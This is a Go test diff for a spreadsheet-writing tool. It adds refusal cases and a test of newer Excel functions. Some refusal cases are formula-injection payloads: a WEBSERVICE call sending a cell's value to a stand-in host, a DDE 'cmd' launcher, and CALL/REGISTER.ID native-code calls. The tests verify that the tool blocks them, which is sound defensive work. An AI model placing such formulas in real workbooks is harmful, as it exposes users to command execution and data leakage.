@@ -159,6 +159,15 @@ func TestWriteRefusals(t *testing.T) {
 		{"M1", [][]any{{"=SUM(_xlfn.XLOOKUP(1,A:A,B:B))"}}, "XLOOKUP is a dynamic-array"},
 		{"M1", [][]any{{"=[Budget.xlsx]Sheet1!A1"}}, "external links"},
 		{"M1", [][]any{{"='C:\\\\x\\\\[Old.xls]S'!A1"}}, "external links"},
+		{"M1", [][]any{{"=WEBSERVICE(\"https://x.test/?\"&A1)"}}, "external links"},
+		{"M1", [][]any{{"=_xlfn.FILTERXML(A1,\"//a\")"}}, "external links"},
+		{"M1", [][]any{{"=rtd(\"x\",,\"y\")"}}, "external links"},
+		{"M1", [][]any{{"=CALL(\"k\",\"f\",\"J\")"}}, "external links"},
+		{"M1", [][]any{{"=REGISTER.ID(\"k\",\"f\")"}}, "external links"},
+		{"M1", [][]any{{"=cmd|'/C calc'!A0"}}, "external links"},
+		{"M1", [][]any{{"=SUM(1)+MAP(A1:A3,LAMBDA(x,x))"}}, "MAP is a dynamic-array, LAMBDA"},
+		{"M1", [][]any{{"=GROUPBY(A1:A3,B1:B3,SUM)"}}, "GROUPBY is a dynamic-array"},
+		{"M1", [][]any{{"=REGEXTEST(A1,\"a\")"}}, "REGEXTEST is a dynamic-array"},
 		{"M1", [][]any{{map[string]any{"a": 1}}}, "not a cell value"},
 		{"M1", [][]any{{"= "}}, "is empty"},
 		{"M1", [][]any{{}}, "no cells"},
@@ -186,6 +195,40 @@ func TestWriteRefusals(t *testing.T) {
 	}
 	if v, _ := g.GetCellValue("Data", "B3"); v != "y" {
 		t.Fatalf("B3 = %q", v)
+	}
+}
+
+func TestWriteFutureFunctions(t *testing.T) {
+	fs, _ := newFSStore(t)
+	buildBook(t, fs, "book.xlsx")
+	ctx := threadCtx(fs)
+	rows := [][]any{{
+		"=IFS(B{row}>15,\"big\",TRUE,\"small\")",
+		"=textjoin(\",\",TRUE,A2:A4)",
+		"=_xlfn.MAXIFS(B2:B4,A2:A4,\"<>\")&\"IFS(x)|y\"",
+		"=IFNA(SWITCH(B{row},10.5,1,0),0)+STDEV.S(B2:B4)*0+DAYS360(1,2)*0",
+		"=IFERROR(IFS(IFS(TRUE,TRUE),1),0)",
+	}}
+	if _, err := writeTool(ctx, writeArg{Path: "book.xlsx", Sheet: "Data", Cell: "E2", Rows: rows}); err != nil {
+		t.Fatal(err)
+	}
+	f := reopen(t, fs, "book.xlsx")
+	for _, c := range []struct{ cell, formula, value string }{
+		{"E2", `_xlfn.IFS(B2>15,"big",TRUE,"small")`, "small"},
+		{"F2", `_xlfn.TEXTJOIN(",",TRUE,A2:A4)`, "Alice,Bob,Cara"},
+		{"G2", `_xlfn.MAXIFS(B2:B4,A2:A4,"<>")&"IFS(x)|y"`, "30IFS(x)|y"},
+		{"H2", `_xlfn.IFNA(_xlfn.SWITCH(B2,10.5,1,0),0)+_xlfn.STDEV.S(B2:B4)*0+DAYS360(1,2)*0`, "1"},
+		{"I2", `IFERROR(_xlfn.IFS(_xlfn.IFS(TRUE,TRUE),1),0)`, "1"},
+	} {
+		if fl, _ := f.GetCellFormula("Data", c.cell); fl != c.formula {
+			t.Fatalf("%s formula = %q, want %q", c.cell, fl, c.formula)
+		}
+		if v, err := f.CalcCellValue("Data", c.cell); err != nil || v != c.value {
+			t.Fatalf("%s = %q, %v, want %q", c.cell, v, err, c.value)
+		}
+	}
+	if _, err := writeTool(ctx, writeArg{Path: "book.xlsx", Sheet: "Data", Cell: "E3", Rows: [][]any{{"=HYPERLINK(\"https://x.test\",\"site\")"}}}); err != nil {
+		t.Fatalf("hyperlink: %v", err)
 	}
 }
 
